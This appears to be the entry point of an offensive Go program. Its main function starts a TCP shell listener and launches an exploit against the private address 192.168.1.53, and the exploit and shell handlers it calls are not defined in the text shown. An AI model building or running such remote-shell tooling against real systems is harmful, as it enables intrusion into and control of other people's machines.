package main
/*
import (
  "fmt"
)
*/
func main(){
  go ListenAndHandleTCPShell()
  LaunchExploit("192.168.1.53")
}
